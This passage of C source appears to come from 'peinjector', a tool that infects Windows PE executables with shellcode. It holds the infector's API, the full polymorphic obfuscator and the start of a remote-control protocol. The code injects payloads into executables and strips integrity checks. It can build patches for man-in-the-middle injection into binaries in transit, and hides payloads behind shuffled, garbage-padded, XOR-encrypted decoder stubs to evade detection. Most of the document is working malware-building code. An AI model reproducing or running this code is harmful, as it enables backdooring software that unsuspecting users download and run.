  size_t shellcode_x64size;     //!< Size of x64 shellcode
  char *section_name;           //!< Name of section to insert
  size_t section_namesize;      //!< Size of new section name
  PEINFECT_METHOD methods;      //!< Allowed infection methods
  bool remove_integrity;        //!< Removes integrity checks
  bool rnd_sectionname;         //!< Random section names
  bool try_stealth;             //!< Tries to check if infection could be detected
  bool encrypt;                 //!< Encrypts shellcode before insertion
  uint32_t encrypt_iterations;  //!< Encryption iterations
  uint32_t jump_iterations;     //!< Cross section jump iterations
  uint32_t infect_cnt_x86;      //!< Infection counter x86
  uint32_t infect_cnt_x64;      //!< Infection counter x64
} PEINFECT;

/**
 * PE Infect patch structure
 */
typedef struct _PEINFECT_PATCH {
  unsigned char *mem;           //!< Pointer to memory of current patch part
  size_t memsize;               //!< Size of current patch part
  size_t position;              //!< Position of current patch part
  bool insert;                  //!< If true patch will be inserted, overwritten otherwise
  struct _PEINFECT_PATCH *next; //!< Pointer to next patch part
} PEINFECT_PATCH;

/**
 * Initializes a new PE Infector
 *
 * \param out PE Infector to initialize
 *
 */
void peinfect_init(PEINFECT *out);

/**
 * Sets the section Name to use for a injected section
 *
 * \param section_name     Name of new section if injected
 * \param section_namesize Size of new section name
 * \param random           If true, previous params are ignored and a random section
 *                         name will be used for each injection. (Enabled by default)
 * \param out              PE Infector to configure
 *
 */
void peinfect_set_sectionname(char *section_name, size_t section_namesize, bool random, PEINFECT *out);

/**
 * Gets the section name used for infection
 *
 * \param in               PE Infector
 *
 * \return section name if set, NULL otherwise
 */
char* peinfect_get_sectionname(PEINFECT *in);

/**
 * Sets the methods to use for infection (All are enabled by default, except METHOD_CROSS_SECTION_JUMP)
 *
 * \param methods          Methods to use for infection
 * \param out              PE Infector to configure
 *
 */
void peinfect_set_methods(PEINFECT_METHOD methods, PEINFECT *out);

/**
 * Gets the methods used for infection
 *
 * \param in               PE Infector
 *
 * \return infection methods
 */
PEINFECT_METHOD peinfect_get_methods(PEINFECT *in);

/**
 * Sets the interations for cross section infection. (Limits: Min: 1 Max: 64)
 *
 * \param iterations       Number of iterations to use
 * \param out              PE Infector to configure
 *
 */
void peinfect_set_jumpiterations(uint32_t iterations, PEINFECT *out);

/**
 * Gets the interations for cross section infection
 *
 * \param in               PE Infector
 *
 * \return Number of iterations used
 */
uint32_t peinfect_get_jumpiterations(PEINFECT *in);

/**
 * Sets the interations for encryption. (Limits: Min: 1 Max: 16)
 *
 * \param iterations       Number of iterations to use
 * \param out              PE Infector to configure
 *
 */
void peinfect_set_encryptiterations(uint32_t iterations, PEINFECT *out);

/**
 * Gets the interations for encryption
 *
 * \param in               PE Infector
 *
 * \return Number of iterations used
 */
uint32_t peinfect_get_encryptiterations(PEINFECT *in);

/**
 * Enables encryption of payload (Enabled by default)
 *
 * \param encrypt          Encrypts if true
 * \param out              PE Infector to configure
 *
 */
void peinfect_set_encrypt(bool encrypt, PEINFECT *out);

/**
 * Gets the encryption of payload
 *
 * \param in               PE Infector
 *
 * \return true if set, false otherwise
 */
bool peinfect_get_encrypt(PEINFECT *in);

/**
 * Enables removal of integrity checks (Enabled by default)
 *
 * \param remove_integrity Remove integrity if true
 * \param out              PE Infector to configure
 *
 */
void peinfect_set_removeintegrity(bool remove_integrity, PEINFECT *out);

/**
 * Gets the removal of integrity checks flag
 *
 * \param in               PE Infector
 *
 * \return true if set, false otherwise
 */
bool peinfect_get_removeintegrity(PEINFECT *in);

/**
 * Enables to try to stay stealth (Enabled by default)
 *
 * \param try_stealth      Try to stay stealth if true
 * \param out              PE Infector to configure
 *
 */
void peinfect_set_trystaystealth(bool try_stealth, PEINFECT *out);

/**
 * Gets the try stay stealth flag
 *
 * \param in               PE Infector
 *
 * \return true if set, false otherwise
 */
bool peinfect_get_trystaystealth(PEINFECT *in);

/**
 * Sets shellcode to use
 *
 * \param mem     Pointer to memory containing shellcode
 * \param memsize Size of the shellcode
 * \param x64     If true shellcode will used for x64 PE Files, x86 otherwise
 * \param out     PE Infector which will use the shellcode
 *
 * \return true on success, false otherwise
 */
bool peinfect_set_shellcode(unsigned char *mem, size_t memsize, bool x64, PEINFECT *out);

/**
 * Gets the shellcode used for infection
 *
 * \param in               PE Infector
 * \param x64              returns x64 shellcode if true, x86 otherwise
 *
 * \ return shellcode
 */
unsigned char* peinfect_get_shellcode(PEINFECT *in, bool x64);

/**
 * Sets the infection counter (Some stats)
 *
 * \param counter          Counter to set
 * \param x64              Set x64 counter if true, x86 otherwise
 * \param out              PE Infector which will use the shellcode
 *
 * \ return infection counter
 */
void peinfect_set_infectcounter(uint32_t counter, bool x64, PEINFECT *out);

/**
 * Gets the infection counter (Some stats)
 *
 * \param in               PE Infector
 * \param x64              returns x64 counter if true, x86 otherwise
 *
 * \ return infection counter
 */
uint32_t peinfect_get_infectcounter(PEINFECT *in, bool x64);

/**
 * Infects PE File with preconfigured shellcode
 *
 * \param mem     Pointer to memory containing PE File
 * \param memsize Size of the PE File
 * \param in      Input PEINFECT structure for configuration
 * \param out     infected PE File
 *
 * \return true on success, false otherwise
 */
bool peinfect_infect_full(unsigned char *mem, size_t memsize, PEINFECT *in, PEFILE *out);

/**
 * Infects PE File from disk with preconfigured shellcode
 *
 * \param infile  PE File to infect
 * \param in      Input PEINFECT structure for configuration
 * \param outfile PE File to store
 *
 * \return true on success, false otherwise
 */
bool peinfect_infect_full_file(char *infile, PEINFECT *in, char *outfile);

/**
 * Infects PE File with preconfigured shellcode and creates patch for MITM injection
 *
 * \param mem     Pointer to memory containing PE File
 * \param memsize Size of the PE File
 * \param in      Input PEINFECT structure for configuration
 * \param out     Patch to infect PE File
 *
 * \return true on success, false otherwise
 */
bool peinfect_infect_patch(unsigned char *mem, size_t memsize, PEINFECT *in, PEINFECT_PATCH *out);

/**
 * Infects PE File from disk and tries to generate a patch.
 * (Displays patch debug output)
 *
 * \param infile  PE File to infect
 * \param in      Input PEINFECT structure for configuration
 *
 * \return true on success, false otherwise
 */
bool peinfect_infect_patch_file(char *infile, PEINFECT *in);

/**
 * Serializes patch to memory block
 *
 * \param in      Input PEINFECT_PATCH structure
 * \param mem     Output memory
 * \param memsize Output memory size
 *
 * \return true on success, false otherwise
 */
bool peinfect_patch_serialize(PEINFECT_PATCH *in, unsigned char **mem, size_t *memsize);

/**
 * Clears PEINFECT structure
 *
 * \param in Input PEINFECT structure
 */
void peinfect_free(PEINFECT *in);

/**
 * Clears PEINFECT_PATCH structure
 *
 * \param in Input PEINFECT_PATCH structure
 */
void peinfect_free_patch(PEINFECT_PATCH *in);

#endif /* LIBPEINFECT_H_ */

```

`peinjector/libpeinfect_obfuscator.c`:

```c
/*
 * \file   libpeinfect_obfuscator.c
 * \author A.A.
 * \brief  peinfect obfuscator sub-library
 */

/* ToDo: additional Anti-Debugging */

#include "libpefile.h"
#include "libpeinfect_obfuscator.h"

/* Shellcode type */
typedef enum _SHELLCODE_TYPE {
  TYPE_CMD = 0x01,  // CMD type
  TYPE_CALL = 0x02, // CAll type
  TYPE_JMP = 0x03,  // JMP type
  TYPE_LOOP = 0x04, // LOOP type
} SHELLCODE_TYPE;

/* Std OpCodes */
typedef enum _OPCODE {
  OP_JMP = '\xeb', // JMP opcode
  OP_LOOP = '\xe2', // LOOP opcode
  OP_CALL = '\xe8', // CALL opcode
} OPCODE;

/* Shellcode Entry Holder */
typedef struct _SHELLCODE_ENTRY {
  unsigned char *code;    // Shellcode to insert
  size_t codesize;        // Shellcode size
  unsigned char *garbage; // Garbage to inert
  size_t garbagesize;     // Garbage size
  size_t index;           // Index of entry
  size_t target;          // Target entry (for jmp types)
  SHELLCODE_TYPE type;    // Entry type
} SHELLCODE_ENTRY;

/* Shellcode */
typedef struct _SHELLCODE {
  SHELLCODE_ENTRY *entry; // Entrys
  size_t entrys;          // Entry counter
  size_t total_size;      // Total shellcode size
  bool x64;               // x64 Mode
  bool fix_last;          // don't shuffle last entry
} SHELLCODE;

/* Generate garbage */
static inline unsigned char* __peinfector_obfuscator_generate_garbage(SHELLCODE *shellcode, size_t *size) {
  unsigned char *garbage = NULL;
  switch (shellcode->x64 ? (2 + rand() % 3) : (rand() % 5)) {
    /* Break alignment */
    case 0:
    case 1:
      *size = 4;
      garbage = malloc(*size);
      if (garbage == NULL) {
        *size = 0;
        return NULL;
      }
      memcpy(garbage, "\xeb\xff\xc0\x48", *size);
      break;

      /* Random garbage */
    case 2:
      *size = 3 + rand() % 6;
      garbage = malloc(*size);
      if (garbage == NULL) {
        *size = 0;
        return NULL;
      }
      garbage[0] = '\xeb';
      garbage[1] = (unsigned char) ((int) *size - (int) 2);
      break;

      /* NOPs */
    case 3:
      *size = 1 + rand() % 2;
      garbage = malloc(*size);
      if (garbage == NULL) {
        *size = 0;
        return NULL;
      }
      memset(garbage, '\x90', *size);
      break;

      /* Nothing */
    default:
      *size = 0;
      garbage = NULL;
  }

  return garbage;
}

/* Shuffles array */
static void __peinfector_obfuscator_shuffle(void *array, size_t n, size_t size) {
  char tmp[size];
  char *arr = array;
  size_t stride = size * sizeof(char);

  if (n > 1) {
    size_t i;
    for (i = 0; i < n - 1; ++i) {
      size_t rnd = (size_t) rand();
      size_t j = i + rnd / (RAND_MAX / (n - i) + 1);

      memcpy(tmp, arr + j * stride, size);
      memcpy(arr + j * stride, arr + i * stride, size);
      memcpy(arr + i * stride, tmp, size);
    }
  }
}

/* Generate new shellcode */
static inline SHELLCODE* __peinfector_obfuscator_shellcode_new() {
  SHELLCODE *shellcode = calloc(1, sizeof(SHELLCODE));

  return shellcode;
}

/* Sets x64 mode */
static inline void __peinfector_obfuscator_shellcode_set_x64(SHELLCODE *shellcode, bool _x64) {
  shellcode->x64 = _x64;
}

/* Sets fix last mode (Doesn't shuffle last Entry) */
static inline void __peinfector_obfuscator_shellcode_fix_last(SHELLCODE *shellcode, bool fix_last) {
  shellcode->fix_last = fix_last;
}

/* Generate new shellcode */
static inline void __peinfector_obfuscator_shellcode_free(SHELLCODE *shellcode) {
  size_t i = 0;
  /* Free code and garbage */
  for (i = 0; i < shellcode->entrys; ++i) {
    /* Free each code */
    if (shellcode->entry[i].code != 0) {
      free(shellcode->entry[i].code);
    }
    /* Free each garbage */
    if (shellcode->entry[i].garbage != 0) {
      free(shellcode->entry[i].garbage);
    }
  }

  /* Free holder*/
  free(shellcode->entry);

  /* Free shellcode container*/
  free(shellcode);
}

/* Add shellcode entry */
static inline int __peinfector_obfuscator_shellcode_add_entry(SHELLCODE *shellcode, char *code, size_t codesize,
bool add_garbage) {
  SHELLCODE_ENTRY *entry = NULL;

  /* Add entry */
  shellcode->entry = realloc(shellcode->entry, (shellcode->entrys + 1) * sizeof(SHELLCODE_ENTRY));
  if (shellcode->entry == NULL) {
    return -1;
  }
  memset(&shellcode->entry[shellcode->entrys], 0, sizeof(SHELLCODE_ENTRY));
  entry = (SHELLCODE_ENTRY*) &shellcode->entry[shellcode->entrys];

  /* Set Entry */
  entry->index = shellcode->entrys;
  entry->code = malloc(codesize);
  entry->codesize = codesize;
  entry->type = TYPE_CMD;
  entry->target = shellcode->entrys + 1;
  if (entry->code == NULL) {
    return -1;
  }
  memcpy(entry->code, code, codesize);

  /* Add garbage */
  if (add_garbage) {
    entry->garbage = __peinfector_obfuscator_generate_garbage(shellcode, &entry->garbagesize);
  }

  /* Increase size */
  shellcode->total_size += entry->garbagesize + entry->codesize;

  /* Increase entry counter*/
  shellcode->entrys++;

  /* Return entry index */
  return shellcode->entrys - 1;
}

/* Add shellcode jmp/loop/call */
static inline int __peinfector_obfuscator_shellcode_add_generic_jmp(SHELLCODE *shellcode, SHELLCODE_TYPE type,
    size_t size_correction, size_t target, bool add_garbage) {
  SHELLCODE_ENTRY *entry = NULL;

  /* Add entry */
  shellcode->entry = realloc(shellcode->entry, (shellcode->entrys + 1) * sizeof(SHELLCODE_ENTRY));
  if (shellcode->entry == NULL) {
    return -1;
  }
  memset(&shellcode->entry[shellcode->entrys], 0, sizeof(SHELLCODE_ENTRY));
  entry = (SHELLCODE_ENTRY*) &shellcode->entry[shellcode->entrys];

  /* Set Entry */
  entry->index = shellcode->entrys;
  entry->codesize = size_correction;
  entry->target = target;
  entry->type = type;

  /* Add garbage */
  if (add_garbage) {
    entry->garbage = __peinfector_obfuscator_generate_garbage(shellcode, &entry->garbagesize);
  }

  /* Increase size */
  shellcode->total_size += entry->garbagesize + entry->codesize;

  /* Increase entry counter*/
  shellcode->entrys++;

  /* Return entry index */
  return shellcode->entrys - 1;
}

/* Add JMP Entry*/
static inline int __peinfector_obfuscator_shellcode_add_jmp(SHELLCODE *shellcode, size_t target, bool add_garbage) {

  return __peinfector_obfuscator_shellcode_add_generic_jmp(shellcode, TYPE_JMP, 0, target, add_garbage);
}

/* Add LOOP Entry*/
static inline int __peinfector_obfuscator_shellcode_add_loop(SHELLCODE *shellcode, size_t target, bool add_garbage) {

  return __peinfector_obfuscator_shellcode_add_generic_jmp(shellcode, TYPE_LOOP, 2, target, add_garbage);
}

/* Add CALL Entry*/
static inline int __peinfector_obfuscator_shellcode_add_call(SHELLCODE *shellcode, size_t target, bool add_garbage) {

  return __peinfector_obfuscator_shellcode_add_generic_jmp(shellcode, TYPE_CALL, 3, target, add_garbage);
}

/* get jmp position of entry */
static inline int __peinfector_obfuscator_shellcode_get_jmp_pos(SHELLCODE *shellcode, int entry) {
  size_t pos = 0;
  size_t i = 0;

  if (entry == -1) {
    return 0;
  }

  /* Find position to insert JMP after shuffling */
  pos = 2;
  for (i = 0; i < shellcode->entrys; ++i) {
    pos += (shellcode->entry[i].garbagesize + shellcode->entry[i].codesize + 2);
    if (shellcode->entry[i].index == entry) {
      /* Correct position (CALL 5, LOOP 4, all other 2) */
      pos -= (shellcode->entry[i].type == TYPE_CALL) ? 5 : ((shellcode->entry[i].type == TYPE_LOOP) ? 4 : 2);
      break;
    }
  }

  return pos;
}

/* Calculates delta between 2 entrys (end entry 1 -> start entry 2) */
static inline int __peinfector_obfuscator_shellcode_find_delta(SHELLCODE *shellcode, uint32_t size, int entry1,
    int entry2) {
  size_t i = 0;
  size_t pos_1 = 0;
  size_t pos_2 = 0;

  /* End of entry 1*/
  if (entry1 == -1) {
    pos_1 = 2;
  } else {
    pos_1 = 2;
    for (i = 0; i < shellcode->entrys; ++i) {
      pos_1 += (shellcode->entry[i].garbagesize + shellcode->entry[i].codesize + 2);
      if (shellcode->entry[i].index == entry1) {
        break;
      }
    }
  }

  /* Start of entry 2*/
  if ((entry2 == -1) || (entry2 == shellcode->entrys)) {
    pos_2 = size;
  } else {
    pos_2 = 2;
    for (i = 0; i < shellcode->entrys; ++i) {
      if (shellcode->entry[i].index == entry2) {
        break;
      }
      pos_2 += (shellcode->entry[i].garbagesize + shellcode->entry[i].codesize + 2);
    }
  }

  /* Return delta position */
  return pos_2 - pos_1;
}

static inline void __peinfector_obfuscator_build_relative_jmp(unsigned char *shellcode, uint32_t pos, OPCODE opcode,
    int jmp_delta) {

  shellcode[pos] = opcode;

  /* Relative target */
  if ((jmp_delta == 0) && (opcode != OP_LOOP)) {
    /* NOP */
    if (opcode == OP_CALL) {
      memset(&shellcode[pos], 0x90, 5);
    } else {
      memset(&shellcode[pos], 0x90, 2);
    }
    /* jmp forward */
  } else if (jmp_delta > 0) {
    if (opcode == OP_LOOP) {
      jmp_delta += 4;
    }
    shellcode[pos + 1] = (unsigned char) jmp_delta;
    if (opcode == OP_CALL) {
      memset(&shellcode[pos + 2], 0x00, 3);
    }
    /* jmp backward */
  } else {
    if (opcode == OP_LOOP) {
      jmp_delta += 4;
    }
    shellcode[pos + 1] = (unsigned char) ((int) 0xfe + (int) (jmp_delta + 2));
    if (opcode == OP_CALL) {
      memset(&shellcode[pos + 2], 0xff, 3);
    }
  }
}

/* Generates new randomized shellcode */
static inline unsigned char* __peinfector_obfuscator_shellcode_generate(SHELLCODE *shellcode, size_t *size) {
  int i = 0;
  uint32_t pos = 0;
  uint32_t jmp_pos = 0;
  int jmp_delta = 0;
  unsigned char *shellcode_buf = NULL;

  /* Shuffle entrys */
  __peinfector_obfuscator_shuffle(shellcode->entry, (shellcode->entrys - (shellcode->fix_last ? 1 : 0)),
      sizeof(SHELLCODE_ENTRY));

  /* Calculate size */
  *size = ((shellcode->entrys + 1) * 2) + shellcode->total_size;

  /* Allocate shellcode */
  shellcode_buf = malloc(*size);
  if (shellcode_buf == NULL) {
    return NULL;
  }

  /* Jump to 0 entry */
  jmp_delta = __peinfector_obfuscator_shellcode_find_delta(shellcode, *size, -1, 0);
  __peinfector_obfuscator_build_relative_jmp(shellcode_buf, 0, OP_JMP, jmp_delta);
  pos = 2;

  /* Write shellcode, garbage and jmps  */
  for (i = 0; i < (int) shellcode->entrys; ++i) {
    /* Write payload data*/
    /* Write garbage */
    if (shellcode->entry[i].garbage != NULL) {
      memcpy(shellcode_buf + pos, shellcode->entry[i].garbage, shellcode->entry[i].garbagesize);
    }
    pos += shellcode->entry[i].garbagesize;

    /* Write shellcode data */
    if (shellcode->entry[i].code != NULL) {
      memcpy(shellcode_buf + pos, shellcode->entry[i].code, shellcode->entry[i].codesize);
    }
    pos += shellcode->entry[i].codesize + 2;

    /* Write jmps */
    /* Position of jmp cmd */
    jmp_pos = __peinfector_obfuscator_shellcode_get_jmp_pos(shellcode, shellcode->entry[i].index);
    /* Difference to next entry */
    jmp_delta = __peinfector_obfuscator_shellcode_find_delta(shellcode, *size, shellcode->entry[i].index,
        shellcode->entry[i].target);

    switch (shellcode->entry[i].type) {
      case TYPE_CMD:
      case TYPE_JMP:
        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos, OP_JMP, jmp_delta);
        break;
      case TYPE_LOOP:
        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos, OP_LOOP, jmp_delta - 2);
        jmp_delta = __peinfector_obfuscator_shellcode_find_delta(shellcode, *size, shellcode->entry[i].index,
            shellcode->entry[i].index + 1);
        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos + 2, OP_JMP, jmp_delta);
        break;
      case TYPE_CALL:
        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos, OP_CALL, jmp_delta);
        break;
    }
  }

  /* Return result */
  return shellcode_buf;
}

/* Random uint32 */
static inline uint32_t __peinfect_obfuscator_random_uint32() {
  uint32_t i, p;
  p = rand();
  for (i = 0; i < 2; ++i) {
    p <<= 16;
    p |= rand();
  }
  return p;
}

/* Build XOR pair for value, 32 bit*/
static inline void __peinfect_obfuscator_build_xor_pair_x86(uint32_t value, uint32_t *p1, uint32_t *p2) {
  uint32_t i;
  *p1 = rand();
  for (i = 0; i < 2; ++i) {
    *p1 <<= 16;
    *p1 |= rand();
  }
  *p2 = value ^ *p1;
}

/* Build XOR pair for value, 64 bit*/
static inline void __peinfect_obfuscator_build_xor_pair_x64(uint64_t value, uint64_t *p1, uint64_t *p2) {
  uint32_t i;
  *p1 = rand();
  for (i = 0; i < 4; ++i) {
    *p1 <<= 16;
    *p1 |= rand();
  }
  *p2 = value ^ *p1;
}

unsigned char* peinfect_obfuscator_build_ep_jmp(PEFILE *pe, size_t *jmpsize) {
  uint32_t ep_x86, p1_x86, p2_x86;
  uint64_t ep_x64, p1_x64, p2_x64;
  unsigned char *jmp_payload = NULL;
  static bool add_garbage = true;
  bool error = true;
  char tmp[10] = { 0 };

  /* Takes EntryPoint (ep) and generates an random value p1 and p2 = ep xor
   *
   * Then polymorphic engine creates obfuscated version of the following assembly.
   *
   * ASM: (x64: rax, rbx) (Could be done with less commands, but with more commands
   * the polymorphic engine can create more variants)
   *
   * mov eax, p1
   * mov ebx, p2
   * xor eax, ebx
   * xor ebx, ebx
   * push eax
   * xor eax
   * retn
   */

  /* Shellcode obfuscator engine */
  SHELLCODE *shellcode = __peinfector_obfuscator_shellcode_new();
  if (shellcode == NULL) {
    return NULL;
  }

  /* Cruel solution, but keeps code clean */
  for (;;) {
    /* Get entry point (VA, not RVA) and build hidden jmp */
    if (pe->optional_header_32.Magic == NT_OPTIONAL_32_MAGIC) {
      ep_x86 = pe->optional_header_32.ImageBase + pe->optional_header_32.AddressOfEntryPoint;
      /* Build XOR pair*/
      __peinfect_obfuscator_build_xor_pair_x86(ep_x86, &p1_x86, &p2_x86);

      /* Build return x86 */
      /* mov eax, p1*/
      tmp[0] = '\xb8';
      memcpy(tmp + 1, &p1_x86, sizeof(uint32_t));
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 5, add_garbage) < 0) {
        break;
      }

      /* mov ebx, p2*/
      tmp[0] = '\xbb';
      memcpy(tmp + 1, &p2_x86, sizeof(uint32_t));
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 5, add_garbage) < 0) {
        break;
      }

      /* xor eax, ebx*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x31\xd8", 2, add_garbage) < 0) {
        break;
      }
      /* xor ebx, ebx*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x31\xdb", 2, add_garbage) < 0) {
        break;
      }
      /* push eax*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x50", 1, add_garbage) < 0) {
        break;
      }
      /* xor eax, eax*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x31\xc0", 2, add_garbage) < 0) {
        break;
      }
      /* ret*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\xc3", 1, add_garbage) < 0) {
        break;
      }

    } else {
      ep_x64 = pe->optional_header_64.ImageBase + pe->optional_header_64.AddressOfEntryPoint;
      /* Build XOR pair*/
      __peinfect_obfuscator_build_xor_pair_x64(ep_x64, &p1_x64, &p2_x64);

      /* x64 Mode (Some garbage entrys are not allowed) */
      __peinfector_obfuscator_shellcode_set_x64(shellcode, true);

      /* Build return x64 */
      /* mov rax, p1*/
      tmp[0] = '\x48';
      tmp[1] = '\xb8';
      memcpy(tmp + 2, &p1_x64, sizeof(uint64_t));
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 10, add_garbage) < 0) {
        break;
      }

      /* mov rbx, p2*/
      tmp[1] = '\xbb';
      memcpy(tmp + 2, &p2_x64, sizeof(uint64_t));
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 10, add_garbage) < 0) {
        break;
      }

      /* xor rax, rbx*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x48\x31\xd8", 3, add_garbage) < 0) {
        break;
      }
      /* xor rbx, rbx*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x48\x31\xdb", 3, add_garbage) < 0) {
        break;
      }
      /* push rax*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x50", 1, add_garbage) < 0) {
        break;
      }
      /* xor rax, rax*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\x48\x31\xc0", 3, add_garbage) < 0) {
        break;
      }
      /* ret*/
      if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\xc3", 1, add_garbage) < 0) {
        break;
      }
    }

    /* Everything ok */
    error = false;
    break;
  }

  /* Generate */
  if (!error) {
    jmp_payload = __peinfector_obfuscator_shellcode_generate(shellcode, jmpsize);
  }

  /* Free shellcode obfuscator engine */
  __peinfector_obfuscator_shellcode_free(shellcode);

  return jmp_payload;
}

unsigned char* peinfect_obfuscator_encrypt_payload(unsigned char *payload, size_t payloadsize, size_t *decryptersize,
bool x64) {
  bool add_garbage = false; /* temp. disable garbage insertion because of errors on x86 plattform */
  bool error = true;
  size_t i = 0;
  size_t totalsize = 0;
  unsigned char *decrypter = NULL;
  unsigned char *encrypted = NULL;
  char tmp[10] = { 0 };
  int label_decode = 0;
  int label_getaddr = 0;
  /* Random keys (rnd1 = bit-shift, rnd2 = xor) */
  unsigned char rnd1 = (unsigned char) ((int) 1 + __peinfect_obfuscator_random_uint32() % 7);
  unsigned char rnd2 = (unsigned char) ((int) 1 + __peinfect_obfuscator_random_uint32() % 255);

  /*
   * x86/x64 produces the same code
   *
   * _start:
   * jmp short encoded    ; Load Address
   * getaddr:
   * pop ebx              ; stores data
   * mov ecx, xxxxxxxx    ; shellcode size
   * decode:
   * ror byte ptr [ecx + ebx - 1], rnd  ; Random Bit Rotate
   * xor byte ptr [ecx + ebx - 1], rnd2 ; Random XOr
   * loop short decode
   *
   * jmp ebx ; jmp to shellcode
   * encoded:
   * call getaddr
   * ; Shellcode
   * end _start
   */

  /* Shellcode obfuscator engine */
  SHELLCODE *shellcode = __peinfector_obfuscator_shellcode_new();
  if (shellcode == NULL) {
    return NULL;
  }

  /* x64 Mode (Some garbage entrys are not allowed) */
  __peinfector_obfuscator_shellcode_set_x64(shellcode, x64);

  /* Last command must be at last position */
  __peinfector_obfuscator_shellcode_fix_last(shellcode, true);

  for (;;) {
    /* jmp encoded */
    if (__peinfector_obfuscator_shellcode_add_jmp(shellcode, 7, add_garbage) < 0) {
      break;
    }
    /* getaddr: */
    /* pop ebx */
    if ((label_getaddr = __peinfector_obfuscator_shellcode_add_entry(shellcode, "\x5b", 1, add_garbage)) < 0) {
      break;
    }
    /* set ecx, length */
    tmp[0] = '\xb9';
    memcpy(&tmp[1], &payloadsize, sizeof(uint32_t));
    if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 5, add_garbage) < 0) {
      break;
    }
    /* decode: */
    /* ror byte ptr [ecx + ebx - 1], rn1 */
    tmp[4] = rnd1;
    memcpy(&tmp[0], "\xc0\x4c\x0b\xff", 4);
    if ((label_decode = __peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 5, add_garbage)) < 0) {
      break;
    }
    /* xor byte ptr [ecx + ebx - 1], rnd2 */
    tmp[4] = rnd2;
    memcpy(&tmp[0], "\x80\x74\x19\xff", 4);
    if (__peinfector_obfuscator_shellcode_add_entry(shellcode, tmp, 5, add_garbage) < 0) {
      break;
    }
    /* loop decode */
    if (__peinfector_obfuscator_shellcode_add_loop(shellcode, label_decode, add_garbage) < 0) {
      break;
    }
    /* jmp ebx */
    if (__peinfector_obfuscator_shellcode_add_entry(shellcode, "\xff\xe3", 2, add_garbage) < 0) {
      break;
    }
    /* encoded: */
    /* call getaddr */
    if (__peinfector_obfuscator_shellcode_add_call(shellcode, label_getaddr, add_garbage) < 0) {
      break;
    }

    error = false;
    break;
  }

  /* Generate */
  if (!error) {
    decrypter = __peinfector_obfuscator_shellcode_generate(shellcode, decryptersize);
  }

  /* Free shellcode obfuscator engine */
  __peinfector_obfuscator_shellcode_free(shellcode);

  /* Add payload */
  if (decrypter != NULL) {
    /* Add payload and encode */
    totalsize = *decryptersize + payloadsize;
    encrypted = realloc(decrypter, *decryptersize + payloadsize);
    if (encrypted == NULL) {
      free(decrypter);
      return NULL;
    }
    memcpy(encrypted + *decryptersize, payload, payloadsize);

    /* Encode */
    for (i = *decryptersize; i < totalsize; ++i) {
      encrypted[i] ^= rnd2;
      encrypted[i] = ((encrypted[i] << rnd1) | (encrypted[i] >> (8 - rnd1))) & 0xff;
    }
    *decryptersize = totalsize;
  }

  return encrypted;
}

```

`peinjector/libpeinfect_obfuscator.h`:

```h
/**
 * \file   libpeinfect_obfuscator.h
 * \author A.A.
 * \brief  peinfect obfuscator sub-library
 */

#ifndef LIBPEINFECT_OBFUSCATOR_H_
#define LIBPEINFECT_OBFUSCATOR_H_

#include "libpeinfect.h"

/**
 * Build obfuscated jump to entry point (ep)
 *
 * \param pe               PEFILE to build jump
 * \param jumpsize         Size of generated shellcode
 *
 * \return shellcode if success, NULL otherwise
 */
unsigned char* peinfect_obfuscator_build_ep_jmp(PEFILE *pe, size_t *jmpsize);

/**
 * Encodes payload and attaches obfuscated decoder stub
 *
 * \param payload           Payload to encode
 * \param payloadsize       Size of payload
 * \param encodedsize       Size of generated shellcode
 * \param x64               Enables x64 mode
 *
 * \return shellcode if success, NULL otherwise
 */
unsigned char* peinfect_obfuscator_encrypt_payload(unsigned char *payload, size_t payloadsize, size_t *encodedsize,
    bool x64);

#endif /* LIBPEINFECT_OBFUSCATOR_H_ */

```

`peinjector/libpeprotocol.c`:

```c
/*
 * \file   libpeprotocol.c
 * \author A.G.
 * \brief
 */

#include "libpeprotocol.h"
#include "3rdparty/ini/minIni.h"
#ifdef _WIN32 /* Windows/Linux Switch */
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#endif
#include <stdarg.h>
#include <time.h>

/* Commands */
typedef enum _PEPROTOCOL_CMD {
  /* Command - CMDs */
  CMD_SEND_ECHO = 0x01,
  CMD_SEND_RESTART = 0x02,
  CMD_SEND_SET_SECTION_NAME = 0x03,
  CMD_SEND_SET_METHOD_CHANGE_FLAGS = 0x04,
  CMD_SEND_SET_METHOD_NEW_SECTION = 0x05,
  CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE = 0x06,
  CMD_SEND_SET_METHOD_ALIGNMENT = 0x07,
  CMD_SEND_SET_REMOVE_INTEGRITY_CHECK = 0x08,
  CMD_SEND_SET_DATA_PORT = 0x09,
  CMD_SEND_SET_DATA_INTERFACE = 0x0A,
  CMD_SEND_SET_CONTROL_PORT = 0x0B,
  CMD_SEND_SET_CONTROL_INTERFACE = 0x0C,
  CMD_SEND_SET_PAYLOAD_X86 = 0x0D,
  CMD_SEND_SET_PAYLOAD_X64 = 0x0E,
  CMD_SEND_GET_CONFIG = 0x0F,
  CMD_SEND_SET_PAYLOAD_NAME_X86 = 0x10,
  CMD_SEND_SET_TRY_STAY_STEALTH = 0x11,
  CMD_SEND_SET_ENABLE = 0x12,
  CMD_SEND_SET_RANDOM_SECTION_NAME = 0x13,
  CMD_SEND_SHUTDOWN = 0x14,
  CMD_SEND_SET_PAYLOAD_NAME_X64 = 0x15,
